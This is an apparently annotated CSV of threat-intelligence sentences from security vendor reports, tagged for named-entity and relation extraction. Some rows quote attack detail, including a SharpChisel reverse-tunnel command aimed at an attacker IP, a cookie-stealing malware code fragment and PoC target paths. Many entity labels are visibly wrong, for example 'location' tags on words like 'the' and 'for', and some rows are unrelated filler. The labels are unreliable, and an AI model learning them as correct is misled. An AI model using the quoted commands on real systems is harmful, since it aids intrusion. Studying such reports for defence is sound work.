,index,text,entities,relations,Comments,id,label,start_offset,end_offset
2723,8947,"The OS information collection routine gathers the following information:  GUID: (randomly generated guid, stored in /tmp/guid) computer name: uname (nodename)",[],[],[],,,,
2724,11691, mail.mofa.gov.np  ,[],[],[],,,,
2725,2268,We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.,[],[],[],,,,
2726,2398,"On March 29, 2022, the Spring Cloud Expression Resource Access Vulnerability tracked in CVE-2022-22963 was patched with the release of Spring Cloud Function 3.1.7 and 3.2.3.","[{'id': 47468, 'label': 'TIME', 'start_offset': 3, 'end_offset': 17}, {'id': 47470, 'label': 'vulnerability', 'start_offset': 88, 'end_offset': 102}, {'id': 47469, 'label': 'vulnerability', 'start_offset': 23, 'end_offset': 76}, {'id': 47471, 'label': 'SOFTWARE', 'start_offset': 135, 'end_offset': 172}]","[{'id': 332, 'from_id': 47471, 'to_id': 47470, 'type': 'has'}]",[],47468.0,TIME,3.0,17.0
2727,11944,We received leads from Graphika that supported us in this investigation.,[],[],[],,,,
2728,8114,We were able to download five exploits from the C&C server during our investigation.,[],[],[],,,,
2729,9775, Figure 10.,[],[],[],,,,
2730,1985," By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
2731,3756,Deobfuscating these scripts reveals they are versions of the known bot family “Stealth Shellbot” that reaches out to an IRC server to listen for commands to perform.,"[{'id': 49589, 'label': 'malware', 'start_offset': 79, 'end_offset': 95}]",[],[],49589.0,malware,79.0,95.0
2732,5735,"Also, read about a data breach from IoT company Wyze that exposed information of 2.4 million customers.",[],[],[],,,,
2733,237, We manually analyzed a sample set of these cybersquatting domains.,"[{'id': 45782, 'label': 'attack-pattern', 'start_offset': 44, 'end_offset': 58}]",[],[],45782.0,attack-pattern,44.0,58.0
2734,4132,Exploitation,[],[],[],,,,
2735,3202,"The Python runtime is usually a ZIP file with all required executables, as well as the DLL and Python libraries necessary for running Python scripts on machines where Python is not installed.","[{'id': 48329, 'label': 'SOFTWARE', 'start_offset': 4, 'end_offset': 10}, {'id': 48330, 'label': 'SOFTWARE', 'start_offset': 95, 'end_offset': 101}, {'id': 48331, 'label': 'SOFTWARE', 'start_offset': 134, 'end_offset': 140}, {'id': 48332, 'label': 'SOFTWARE', 'start_offset': 167, 'end_offset': 173}]",[],[],48329.0,SOFTWARE,4.0,10.0
2736,5869,"They could be patriotic hackers, they could just be guns for hire or cyber guns for hire, so to speak.","[{'id': 18062, 'label': 'identity', 'start_offset': 44, 'end_offset': 48}]",[],[],18062.0,identity,44.0,48.0
2737,675," As you can see in this example, attackers try to convince users to disable the security mechanisms added by Microsoft using social engineering, convincing the user to enable content for them to be able to see the full document.","[{'id': 45797, 'label': 'attack-pattern', 'start_offset': 125, 'end_offset': 143}, {'id': 44822, 'label': 'identity', 'start_offset': 109, 'end_offset': 118}]",[],[],45797.0,attack-pattern,125.0,143.0
2738,6252,"After a few seconds the video tells the user they need to download an update for Flash player, which is the initial dropper executable.","[{'id': 19378, 'label': 'TIME', 'start_offset': 6, 'end_offset': 19}]",[],[],19378.0,TIME,6.0,19.0
2739,10700,"Protect your web server against potential harm To mitigate the potential risk of attacks from open-source software, software composition analysis (SCA) has become an effective approach.","[{'id': 32671, 'label': 'attack-pattern', 'start_offset': 99, 'end_offset': 105}]",[],[],32671.0,attack-pattern,99.0,105.0
2740,10223,"The group also performed widespread brute force attacks to steal credentials such as those of corporate email accounts, as evidenced by network probes we attribute to Pawn Storm and the loose way the actor abused compromised email accounts in malware and in sending spear-phishing emails.","[{'id': 31231, 'label': 'attack-pattern', 'start_offset': 36, 'end_offset': 47}, {'id': 31233, 'label': 'location', 'start_offset': 178, 'end_offset': 181}, {'id': 31234, 'label': 'location', 'start_offset': 192, 'end_offset': 195}, {'id': 31235, 'label': 'location', 'start_offset': 251, 'end_offset': 254}, {'id': 31236, 'label': 'location', 'start_offset': 266, 'end_offset': 271}, {'id': 31237, 'label': 'attack-pattern', 'start_offset': 272, 'end_offset': 280}]",[],[],31231.0,attack-pattern,36.0,47.0
2741,9153,"Lurk then launched a new URL pattern that served payloads round-the-clock, eschewing pre-filtering of IP address locations in favor of targeting global IP addresses.",[],[],[],,,,
2742,7624,Some recent cases we observed even had the Excel file directly attached to the emails.,[],[],[],,,,
2743,1354, CVE-2021-32648 Vulnerability WhisperGate Malware Family Mitigation Actions Hunting for WhisperGate Conclusion Additional Resources,"[{'id': 46685, 'label': 'malware', 'start_offset': 30, 'end_offset': 41}, {'id': 46684, 'label': 'vulnerability', 'start_offset': 1, 'end_offset': 15}, {'id': 46686, 'label': 'malware', 'start_offset': 88, 'end_offset': 99}]",[],[],46685.0,malware,30.0,41.0
2744,4410,"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not.","[{'id': 50207, 'label': 'malware', 'start_offset': 57, 'end_offset': 68}]",[],[],50207.0,malware,57.0,68.0
2745,14421,      Tags  Cloud | APT & Targeted Attacks | Cyber Crime | Expert Perspective | Cyber Threats,[],[],[],,,,
2746,4011,Organizations need to have a deeper understanding of regional and national policies to ensure the safety of the supply chain.,[],[],[],,,,
2747,2238,The malware will periodically poll the C2 server and determine if any commands are received.,[],[],[],,,,
2748,13057,"However, a closer investigation can reveal suspicious behavior that exposes their malicious intent.",[],[],[],,,,
2749,6532,Research,[],[],[],,,,
2750,13279,The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10.,"[{'id': 41372, 'label': 'location', 'start_offset': 10, 'end_offset': 13}, {'id': 41373, 'label': 'malware', 'start_offset': 37, 'end_offset': 44}]",[],[],41372.0,location,10.0,13.0
2751,3897,"The fact sheet comes after numerous ransomware attacks on key critical infrastructures in the US and abroad, including the attack on Colonial Pipeline by DarkSide.","[{'id': 49749, 'label': 'location', 'start_offset': 94, 'end_offset': 96}, {'id': 49751, 'label': 'threat-actor', 'start_offset': 154, 'end_offset': 162}, {'id': 49750, 'label': 'identity', 'start_offset': 133, 'end_offset': 150}]","[{'id': 864, 'from_id': 49751, 'to_id': 49750, 'type': 'targets'}]",[],49749.0,location,94.0,96.0
2752,1666,"Upon receiving the initial packet, the server uses the seed value and password to generate the client’s session key.",[],[],[],,,,
2753,413,"And unlike spam or phishing, these attacks also don’t require any lapse in vigilance by the user: they can happen simply by going to websites users know and trust.","[{'id': 46111, 'label': 'attack-pattern', 'start_offset': 11, 'end_offset': 15}, {'id': 46112, 'label': 'attack-pattern', 'start_offset': 19, 'end_offset': 27}]",[],[],46111.0,attack-pattern,11.0,15.0
2754,13009," Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation.",[],[],[],,,,
2755,5145,I'm going to drive to the store to get ketchup.,[],[],[],,,,
2756,10844,A snippet of the file harvesting code      MSG_TRIG_ALARM_COLLECT,[],[],[],,,,
2757,3821,Get Architecture {Variable}.user.info Get User Information {Variable}.work,[],[],[],,,,
2758,4133,"After successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim’s intranet.",[],[],[],,,,
2759,9934," Figure 2. APT33’s usage of a private VPN network APT33 used its private VPN network to access websites of penetration testing companies, webmail, websites on vulnerabilities, and websites related to cryptocurrencies, as well as to read hacker blogs and forums.","[{'id': 30330, 'label': 'threat-actor', 'start_offset': 11, 'end_offset': 16}, {'id': 30332, 'label': 'location', 'start_offset': 176, 'end_offset': 179}, {'id': 30333, 'label': 'location', 'start_offset': 250, 'end_offset': 253}]",[],[],30330.0,threat-actor,11.0,16.0
2760,5214,We sent RPTS discovery probes to the entire IPv4 space (except for the no-scan subnets) and received answers from 643 hosts (excluding obvious honeypots).,[],[],[],,,,
2761,13331, This is not the first time that APT41 activities have been scrutinized — the group has been active for some time.,"[{'id': 41494, 'label': 'location', 'start_offset': 23, 'end_offset': 27}, {'id': 41495, 'label': 'threat-actor', 'start_offset': 33, 'end_offset': 38}, {'id': 41496, 'label': 'location', 'start_offset': 109, 'end_offset': 113}]",[],[],41494.0,location,23.0,27.0
2762,12284,This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2020.,[],[],[],,,,
2763,2704,"On Saturday, Microsoft disclosed a critical vulnerability in Internet Explorer, CVE-2014-1776, affecting Internet Explorer versions 6 through 11.","[{'id': 47941, 'label': 'TIME', 'start_offset': 3, 'end_offset': 11}, {'id': 47942, 'label': 'identity', 'start_offset': 13, 'end_offset': 22}, {'id': 47944, 'label': 'vulnerability', 'start_offset': 80, 'end_offset': 93}, {'id': 47945, 'label': 'SOFTWARE', 'start_offset': 105, 'end_offset': 133}, {'id': 47943, 'label': 'SOFTWARE', 'start_offset': 61, 'end_offset': 78}]","[{'id': 368, 'from_id': 47944, 'to_id': 47945, 'type': 'has'}]",[],47941.0,TIME,3.0,11.0
2764,3160,"Better together Trend Micro and AWS have been working closely together for over a decade now, and this latest announcement represents another exciting stage in the journey.","[{'id': 48278, 'label': 'identity', 'start_offset': 16, 'end_offset': 27}, {'id': 48279, 'label': 'identity', 'start_offset': 32, 'end_offset': 35}]",[],[],48278.0,identity,16.0,27.0
2765,5424,The APT group behind this malware has learned from its VPNFilter campaigns and continues to attack IoT devices such as routers.,"[{'id': 51431, 'label': 'malware', 'start_offset': 55, 'end_offset': 64}]",[],[],51431.0,malware,55.0,64.0
2766,220,"We noticed an overall increase in the detection of websites that host phishing and scam URLs on domains using Ukraine-related TLDs such as gov.ua and com.ua, or containing popular Ukraine-related keywords such as ""ukraine"" and ""ukrainian"".","[{'id': 45915, 'label': 'attack-pattern', 'start_offset': 70, 'end_offset': 78}, {'id': 45918, 'label': 'location', 'start_offset': 214, 'end_offset': 221}, {'id': 45919, 'label': 'location', 'start_offset': 110, 'end_offset': 117}]",[],[],45915.0,attack-pattern,70.0,78.0
2767,3770,  Another proof of concept code sample is additionally available targeting the following 2 filepaths: /opt/vmware/certproxy/bin/certproxyService.sh /usr/local/horizon/scripts/diagnostic/getPasswordExpiry.hzn  ,"[{'id': 49603, 'label': 'FILEPATH', 'start_offset': 148, 'end_offset': 207}, {'id': 49602, 'label': 'FILEPATH', 'start_offset': 102, 'end_offset': 147}]",[],[],49603.0,FILEPATH,148.0,207.0
2768,1236," The good news is this technique might be partially mitigated in Android KitKat (version 4.4), where Google introduced a security enhancement around SMS security.","[{'id': 46619, 'label': 'identity', 'start_offset': 101, 'end_offset': 107}, {'id': 46620, 'label': 'SOFTWARE', 'start_offset': 65, 'end_offset': 93}]",[],[],46619.0,identity,101.0,107.0
2769,5187,"Core Language Year Developed Fast-DDS eProsima EMEA Apache License 2.0 C++ 2014 Cyclone DDS Eclipse Foundation project, driven by ADLINK EMEA Eclipse Public License 2.0 and Eclipse Development License 1.0 C 2011 OpenDDS OCI NABU Custom C++ 2005 Connext DDS RTI NABU Extensions are open source C++ 2005 (NDDS – 1995) CoreDX DDS TwinOaks NABU Not open source C 2009 Gurum DDS GurumNetworks APAC Not open source C    Table 1.",[],[],[],,,,
2770,4476,"We assess with high confidence that commercial surveillance company Cytrox packaged these vulnerabilities, and sold the hacking software to at least eight governments.","[{'id': 50275, 'label': 'threat-actor', 'start_offset': 68, 'end_offset': 74}]",[],[],50275.0,threat-actor,68.0,74.0
2771,5245, Sphinx reportedly uses the watering hole technique via social media sites to deliver its payloads — mainly a customized version of njRAT.,"[{'id': 51279, 'label': 'campaign', 'start_offset': 1, 'end_offset': 7}, {'id': 51280, 'label': 'malware', 'start_offset': 132, 'end_offset': 137}]","[{'id': 1073, 'from_id': 51279, 'to_id': 51280, 'type': 'uses'}]",[],51279.0,campaign,1.0,7.0
2772,3877,"In addition, comprehensive security solutions can be used to protect organizations from attacks.",[],[],[],,,,
2773,7091,Encrypted Communication   D3DES  https://gitlab.gnome.org/GNOME/gtk-vnc/-/blob/v0.1.0/src/d3des.c  Compression  QuickLZ  https://github.com/robottwo/quicklz   Table 4.,"[{'id': 22208, 'label': 'URL', 'start_offset': 121, 'end_offset': 156}]",[],[],22208.0,URL,121.0,156.0
2774,11545,"Unlike many hack-for-hire actors that use open source phishing frameworks like Evilginx or GoPhish, this group uses a custom phishing kit that utilizes Selenium, a self described 'suite of tools for automating web browsers.'","[{'id': 35376, 'label': 'location', 'start_offset': 7, 'end_offset': 11}, {'id': 35377, 'label': 'location', 'start_offset': 12, 'end_offset': 16}, {'id': 35378, 'label': 'attack-pattern', 'start_offset': 47, 'end_offset': 53}, {'id': 35379, 'label': 'attack-pattern', 'start_offset': 54, 'end_offset': 62}, {'id': 35381, 'label': 'attack-pattern', 'start_offset': 125, 'end_offset': 133}]",[],[],35376.0,location,7.0,11.0
2775,12394,"We terminated 1,628 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China.",[],[],[],,,,
2776,10310, Troj.Win32.TRX.XXPE50FFF039  faf8db358e5d3dbe2eb9968d8b19f595f45991d938427124161f5ed45ac958d5  email.exe,"[{'id': 31455, 'label': 'SHA2', 'start_offset': 30, 'end_offset': 94}]",[],[],31455.0,SHA2,30.0,94.0
2777,2195,"These files were added to the end of the Trojan executable, as seen below.",[],[],[],,,,
2778,13136,"While buyers usually aim for lead times of weeks or months, the questionnaires themselves can get stuck in a bottleneck if forwarded first to IT service partners.",[],[],[],,,,
2779,14082,      Figure 10.,[],[],[],,,,
2780,4066,Open a command shell for command execution      ,[],[],[],,,,
2781,6485,We then see the threat actor again attempting to use SharpChisel several times using the following command: C:\programdata\SharpChisel.exe  client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999  powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999,[],[],[],,,,
2782,7122,"However, we continue seeing samples that feature the “older” behaviors, which suggests that different groups — or possibly subgroups of Iron Tiger — are using this malware family.","[{'id': 22278, 'label': 'threat-actor', 'start_offset': 136, 'end_offset': 146}, {'id': 22279, 'label': 'location', 'start_offset': 149, 'end_offset': 152}]",[],[],22278.0,threat-actor,136.0,146.0
2783,905,HTTP POST request containing unique SHA256 key  PClock2 scans the file system of the victim in order to identify files that are to be encrypted.,[],[],[],,,,
2784,5522,A new type of data breach,[],[],[],,,,
2785,12788,"This campaign, first observed in 2010, is believed to be operated by a well-funded group given how it appeared to have purchased the source code of the BIFROST backdoor, which the operators enhanced and created other tools from.","[{'id': 39814, 'label': 'location', 'start_offset': 5, 'end_offset': 13}, {'id': 39817, 'label': 'location', 'start_offset': 89, 'end_offset': 94}, {'id': 39818, 'label': 'attack-pattern', 'start_offset': 133, 'end_offset': 139}, {'id': 39819, 'label': 'malware', 'start_offset': 152, 'end_offset': 159}, {'id': 39820, 'label': 'location', 'start_offset': 199, 'end_offset': 202}]",[],[],39814.0,location,5.0,13.0
2786,2678,Its ability to execute processes on other systems spread the ransomware and assisted in reconnaissance activities.,[],[],[],,,,
2787,8786,"We terminated 3,317 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China.",[],[],[],,,,
2788,5508,       Tags  Malware | APT & Targeted Attacks | Endpoints | Research |,[],[],[],,,,
2789,4231,"Excerpt of the valid country list We noted that it does both client-side and server-side IP filtering, showing that the attacker has improved its infrastructure.",[],[],[],,,,
2790,1568, Attack Overview,[],[],[],,,,
2791,2983,You can generate the password for them and retain it as the “administrator” if you want for monitoring.,[],[],[],,,,
2792,13342,The threat actors use a scheduled task command to spread and infect a victim's environment.,"[{'id': 41523, 'label': 'attack-pattern', 'start_offset': 24, 'end_offset': 38}, {'id': 41524, 'label': 'location', 'start_offset': 57, 'end_offset': 60}]",[],[],41523.0,attack-pattern,24.0,38.0
2793,13098,"The job of the ROS-I Consortium is to prioritize these capabilities, offer code quality standards and provide technical support and training.",[],[],[],,,,
2794,4686,{ try { JsonInfo jsonInfo = pipeCommunication.Read(); switch (jsonInfo.Type) { case JsonType.GetCookies: jsonInfo.Data = this.CookieText; pipeCommunication.Write(jsonInfo); break; case JsonType.TakeOutFile: flag = true; break; case JsonType.GetUsername: while (this.OperationObject.GetUsername() == null) { Thread.Sleep(1000); },[],[],[],,,,
2795,2727,"At the time of release, Microsoft affirmed that they had not yet seen the vulnerability exploited in the wild (ITW).","[{'id': 45676, 'label': 'identity', 'start_offset': 24, 'end_offset': 33}]",[],[],45676.0,identity,24.0,33.0
2796,849,"In a kernel APC attack, the attacker gives a legitimate program’s place in line to the attacker’s code.","[{'id': 44891, 'label': 'attack-pattern', 'start_offset': 5, 'end_offset': 22}]",[],[],44891.0,attack-pattern,5.0,22.0
2797,4069,It is used to translate between objects in code and objects representation in MongoDB.,"[{'id': 49907, 'label': 'SOFTWARE', 'start_offset': 78, 'end_offset': 85}]",[],[],49907.0,SOFTWARE,78.0,85.0
2798,13918,"In total, more than 2 TB of stolen data is currently being hosted on DarkSide sites, and 100% of victims’ stolen files are leaked.","[{'id': 48740, 'label': 'malware', 'start_offset': 69, 'end_offset': 77}]",[],[],48740.0,malware,69.0,77.0
2799,5500,Their malware’s resemblance to that of Patchwork’s is also notable.,"[{'id': 51508, 'label': 'threat-actor', 'start_offset': 39, 'end_offset': 48}]",[],[],51508.0,threat-actor,39.0,48.0
2800,951,SMS Theft  ,"[{'id': 44910, 'label': 'attack-pattern', 'start_offset': 0, 'end_offset': 9}]",[],[],44910.0,attack-pattern,0.0,9.0
2801,4321,"Examining the encrypted document containing macros After entering the password mentioned in the message, a document containing macros is displayed on screen.",[],[],[],,,,
2802,1859,     Figure 25. Deploying malicious batch scripts to other endpoints     The deployed batch script has the following commands:  Disable Windows Update and Microsoft Defender       Figure 26. Disable Microsoft defense services      Prevents safeboot execution of security products       Figure 27. Prevent security products’ execution      Create new administrator account       Figure 28. Create new account      Add the AutoStart mechanism for the AvosLocker executable (update.exe)       Figure 29. Add Autostart for ransomware executable      Disables legal notice caption       Figure 30. Disable legal notice      Set safeboot with networking and disables Windows Error Recovery and reboot       Figure 31. Setting and disabling network and specific Windows functions     Conclusion,"[{'id': 46990, 'label': 'malware', 'start_offset': 449, 'end_offset': 459}, {'id': 46991, 'label': 'FILEPATH', 'start_offset': 472, 'end_offset': 482}, {'id': 46987, 'label': 'tools', 'start_offset': 136, 'end_offset': 150}, {'id': 46988, 'label': 'tools', 'start_offset': 155, 'end_offset': 173}]",[],[],46990.0,malware,449.0,459.0
2803,5267,"Beyond its effects, AnubisSpy also highlights the significance of proactively securing mobile devices, particularly if they’re on BYOD programs and used to access sensitive data.","[{'id': 51304, 'label': 'malware', 'start_offset': 20, 'end_offset': 29}]",[],[],51304.0,malware,20.0,29.0
2804,11126,"In the threat actor toolkit, different types of attacks are used for different purposes: Phishing campaigns can be used like a scalpel—targeting specific groups or individuals with personalized lures that are more likely to trick them into taking action (like clicking on a malware link), while DDoS attacks are more like a hatchet—disrupting or blocking a site or a service entirely.","[{'id': 33989, 'label': 'location', 'start_offset': 56, 'end_offset': 59}, {'id': 33990, 'label': 'attack-pattern', 'start_offset': 89, 'end_offset': 97}, {'id': 33991, 'label': 'location', 'start_offset': 108, 'end_offset': 111}, {'id': 33992, 'label': 'location', 'start_offset': 205, 'end_offset': 208}, {'id': 33993, 'label': 'location', 'start_offset': 214, 'end_offset': 220}, {'id': 33994, 'label': 'location', 'start_offset': 230, 'end_offset': 234}, {'id': 33995, 'label': 'location', 'start_offset': 247, 'end_offset': 253}, {'id': 33996, 'label': 'location', 'start_offset': 308, 'end_offset': 311}]",[],[],33989.0,location,56.0,59.0
2805,3749, The list below details the exploits Unit 42 observed targeting this vulnerability that we deemed worth highlighting.,"[{'id': 49576, 'label': 'identity', 'start_offset': 37, 'end_offset': 44}]",[],[],49576.0,identity,37.0,44.0
2806,5430,It is also important to ensure that only the services that absolutely need to be exposed to the internet are exposed.,[],[],[],,,,
2807,501," Please mark, I'm not a robot!  ",[],[],[],,,,
2808,627, Palo Alto Networks is documenting our prevention capabilities with regard to this threat in the Palo Alto Networks Protections for Petya Ransomware blog post.,"[{'id': 44809, 'label': 'identity', 'start_offset': 1, 'end_offset': 19}, {'id': 44810, 'label': 'identity', 'start_offset': 97, 'end_offset': 115}, {'id': 44811, 'label': 'malware', 'start_offset': 132, 'end_offset': 148}]",[],[],44809.0,identity,1.0,19.0
2809,3236,"The scheduled tasks created by BIOPASS RAT   The BIOPASS RAT malware loads a Python script, “online.txt” that will open an HTTP server that listens on one of the following port numbers: 43990, 43992, 53990, 33990, 33890, 48990, 12880, 22880, 32880, 42880, 52880, or 62880.","[{'id': 48362, 'label': 'FILEPATH', 'start_offset': 93, 'end_offset': 103}, {'id': 48361, 'label': 'SOFTWARE', 'start_offset': 77, 'end_offset': 83}, {'id': 9862, 'label': 'malware', 'start_offset': 31, 'end_offset': 42}, {'id': 9863, 'label': 'malware', 'start_offset': 49, 'end_offset': 60}]",[],[],48362.0,FILEPATH,93.0,103.0
2810,12073,The attackers embed javascript into phishing pages that notify them when the page has been loaded.,"[{'id': 37369, 'label': 'attack-pattern', 'start_offset': 36, 'end_offset': 44}, {'id': 37370, 'label': 'location', 'start_offset': 63, 'end_offset': 67}, {'id': 37371, 'label': 'location', 'start_offset': 77, 'end_offset': 81}]",[],[],37369.0,attack-pattern,36.0,44.0
2811,10214,We are continuously improving our detection methods and investing in new tools and features that automatically identify and stop threats like this one.,"[{'id': 31198, 'label': 'location', 'start_offset': 3, 'end_offset': 6}, {'id': 31199, 'label': 'location', 'start_offset': 52, 'end_offset': 55}, {'id': 31200, 'label': 'location', 'start_offset': 79, 'end_offset': 82}, {'id': 31201, 'label': 'location', 'start_offset': 120, 'end_offset': 123}, {'id': 31202, 'label': 'malware', 'start_offset': 124, 'end_offset': 128}, {'id': 31203, 'label': 'location', 'start_offset': 147, 'end_offset': 150}]",[],[],31198.0,location,3.0,6.0
2812,4147,It can read predefined configurations and make the host in the intranet available to users from the internet.,[],[],[],,,,
2813,1699,"You’ve collected an array of tools (malware), built up your infrastructure (command and control (C2) servers) and you have a process to make money off your hard work.",[],[],[],,,,
2814,225,"  Among these phishing and scam URLs, we found a targeted phishing attack.","[{'id': 751, 'label': 'attack-pattern', 'start_offset': 14, 'end_offset': 22}, {'id': 44645, 'label': 'attack-pattern', 'start_offset': 27, 'end_offset': 36}, {'id': 44646, 'label': 'attack-pattern', 'start_offset': 49, 'end_offset': 73}]",[],[],751.0,attack-pattern,14.0,22.0
2815,10749,"Based on their pdb strings, they’re both components of another REDBALDKNIGHT-related threat, XXMM (TROJ_KVNDM), a downloader Trojan that can also act as a first-stage backdoor with its capability to open a shell.","[{'id': 32848, 'label': 'threat-actor', 'start_offset': 63, 'end_offset': 76}, {'id': 32849, 'label': 'malware', 'start_offset': 93, 'end_offset': 97}, {'id': 32850, 'label': 'location', 'start_offset': 137, 'end_offset': 140}, {'id': 32852, 'label': 'location', 'start_offset': 206, 'end_offset': 211}]",[],[],32848.0,threat-actor,63.0,76.0
2816,2915," Please mark, I'm not a robot!",[],[],[],,,,
2817,14252,These are typical techniques PlugX and Winnti malware variants use to communicate between compromised machines and their C&C servers.,"[{'id': 48446, 'label': 'malware', 'start_offset': 29, 'end_offset': 35}, {'id': 48447, 'label': 'threat-actor', 'start_offset': 39, 'end_offset': 46}]",[],[],48446.0,malware,29.0,35.0
2818,4470,"Although this Committee must be concerned with the exploits of NSO Group, it is not the only entity posing risks to our users.","[{'id': 50260, 'label': 'threat-actor', 'start_offset': 63, 'end_offset': 72}]",[],[],50260.0,threat-actor,63.0,72.0
2819,14220,"The payload is a file named loadoerf.ini that contains decryption, run, and code injection functions.","[{'id': 48249, 'label': 'FILEPATH', 'start_offset': 28, 'end_offset': 40}, {'id': 48250, 'label': 'attack-pattern', 'start_offset': 76, 'end_offset': 90}]","[{'id': 394, 'from_id': 48249, 'to_id': 48250, 'type': 'uses'}]",[],48249.0,FILEPATH,28.0,40.0
2820,11778,We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.,"[{'id': 36310, 'label': 'location', 'start_offset': 10, 'end_offset': 14}, {'id': 36311, 'label': 'location', 'start_offset': 89, 'end_offset': 95}, {'id': 36312, 'label': 'attack-pattern', 'start_offset': 117, 'end_offset': 125}]",[],[],36310.0,location,10.0,14.0
2821,4373,"As part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk users.","[{'id': 50174, 'label': 'identity', 'start_offset': 11, 'end_offset': 14}, {'id': 50178, 'label': 'identity', 'start_offset': 162, 'end_offset': 180}, {'id': 50175, 'label': 'identity', 'start_offset': 55, 'end_offset': 61}, {'id': 50176, 'label': 'threat-actor', 'start_offset': 132, 'end_offset': 137}, {'id': 50177, 'label': 'threat-actor', 'start_offset': 142, 'end_offset': 157}]","[{'id': 924, 'from_id': 50177, 'to_id': 50178, 'type': 'attributed-to'}, {'id': 925, 'from_id': 50176, 'to_id': 50177, 'type': 'duplicate-of'}]",[],50174.0,identity,11.0,14.0
2822,1231,"On the existing Android platforms it is very easy for any installed apps to send, intercept, or even forward SMS messages in background without any user knowledge or interaction.","[{'id': 46612, 'label': 'SOFTWARE', 'start_offset': 16, 'end_offset': 23}]",[],[],46612.0,SOFTWARE,16.0,23.0
2823,4327,Stage 1 is a simple download & execute program.,[],[],[],,,,
2824,2371,Earth Baku has developed these new malware tools to facilitate targeted attacks on public and private entities alike in specific industries that are located in the Indo-Pacific region.,"[{'id': 47426, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 10}, {'id': 47427, 'label': 'location', 'start_offset': 164, 'end_offset': 176}]",[],[],47426.0,threat-actor,0.0,10.0
2825,9441,"For its command-line parameters, PuppetLoader uses the same flawed RC4 implementation using the password “whk0q9ogev6ofg8d”.","[{'id': 29040, 'label': 'malware', 'start_offset': 33, 'end_offset': 45}, {'id': 29041, 'label': 'location', 'start_offset': 55, 'end_offset': 59}]",[],[],29040.0,malware,33.0,45.0
2826,9862,"Modified Mimikatz Conclusion TICK is an organized and persistent cyber espionage group specialized in targeting high-value individuals and organizations, with the skills and resources needed to coordinate sophisticated attacks.","[{'id': 30051, 'label': 'malware', 'start_offset': 9, 'end_offset': 17}, {'id': 30052, 'label': 'threat-actor', 'start_offset': 29, 'end_offset': 33}, {'id': 30053, 'label': 'location', 'start_offset': 50, 'end_offset': 53}, {'id': 30054, 'label': 'location', 'start_offset': 135, 'end_offset': 138}, {'id': 30055, 'label': 'location', 'start_offset': 170, 'end_offset': 173}]",[],[],30051.0,malware,9.0,17.0
2827,8745,We terminated 35 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.,[],[],[],,,,
2828,7368,"The tsm binary then runs in the background, forwarding a series of error messages to /dev/null to keep the code running, ensuring the continuous execution of the code referenced with a set of parameters /tmp/up.txt.",[],[],[],,,,
2829,5003,We’d be remiss if we did not acknowledge the quick response and patching of these vulnerabilities by Google’s Chrome and Android teams.,"[{'id': 51060, 'label': 'identity', 'start_offset': 101, 'end_offset': 134}]",[],[],51060.0,identity,101.0,134.0
2830,2763,"Well-maintained systems will be patched today, but that dusty old system in the networking closet might never get the update.",[],[],[],,,,
2831,2936,This would mean that this operation may affect about 30 million people worldwide.,[],[],[],,,,
2832,3720,Carbanak campaigns can also use legitimate programs and remote access software for command and control.,"[{'id': 49523, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 8}]",[],[],49523.0,threat-actor,0.0,8.0
2833,2924,"Like bitcoin, Monero is generated through “mining” a computationally intensive process that provides cryptocurrency credit in exchange for computing resources provided in service to the cryptocurrency and its transaction infrastructure.","[{'id': 48096, 'label': 'SOFTWARE', 'start_offset': 14, 'end_offset': 20}]",[],[],48096.0,SOFTWARE,14.0,20.0
